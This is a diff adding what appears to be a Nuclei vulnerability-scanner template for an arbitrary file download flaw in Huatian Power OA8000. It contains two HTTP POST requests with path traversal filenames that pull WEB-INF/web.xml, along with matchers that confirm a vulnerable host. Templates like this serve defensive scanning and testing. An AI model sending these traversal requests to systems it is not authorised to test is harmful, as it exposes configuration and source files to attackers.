@@ -1,0 +1,46 @@
+id: huatian-oa8000-arbitrary-file-download
+
+info:
+  name: Huatian Power OA8000 Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Huatian Power OA8000 contains an arbitrary file download vulnerability in the `/OAapp/jsp/trace/ntkodownload.jsp` endpoint, which allows attackers to read sensitive files like configuration or source code files.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /OAapp/jsp/trace/ntkodownload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        filename=../../../OAapp/WEB-INF/web.xml
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<web-app"
+          - "<?xml"
+        part: body
+
+  - raw:
+      - |
+        POST /OAapp/jsp/trace/ntkodownload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        filename=../../../Tomcat/webapps/OAapp/WEB-INF/web.xml
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<web-app"
+          - "<?xml"
+        part: body
